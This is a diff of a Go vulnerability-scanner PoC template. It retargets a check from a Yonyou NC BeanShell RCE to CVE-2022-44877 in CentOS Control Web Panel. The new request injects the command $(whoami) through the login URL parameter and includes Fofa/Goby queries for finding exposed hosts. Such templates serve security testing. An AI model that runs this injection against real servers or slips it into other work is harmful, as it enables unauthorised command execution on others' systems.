@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "Control Web Panel login 远程命令执行漏洞（CVE-2022-44877）",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"CentOS-Control-Web-Panel\" || product=\"CentOS-Control-Web-Panel\"",
+  "GobyQuery": "app=\"CentOS-Control-Web-Panel\" || product=\"CentOS-Control-Web-Panel\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,12 +29,15 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/login/index.php?login=$(whoami)",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Cookie": "cwpsrv-2dbdc5905576590830494c54c04a1b01=6ahj1a6etv72ut1eaupietdk82",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "username=root&password=toor&commit=Login"
       },
       "ResponseTest": {
         "type": "group",
@@ -44,14 +47,14 @@ func init() {
             "type": "item",
             "variable": "$code",
             "operation": "==",
-            "value": "200",
+            "value": "302",
             "bz": ""
           },
           {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "Login Redirect",
             "bz": ""
           }
         ]
@@ -107,7 +110,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "Control Web Panel login 远程命令执行漏洞（CVE-2022-44877）",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +119,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877",
       "Product": "",
       "Description": "",
       "Recommendation": "",
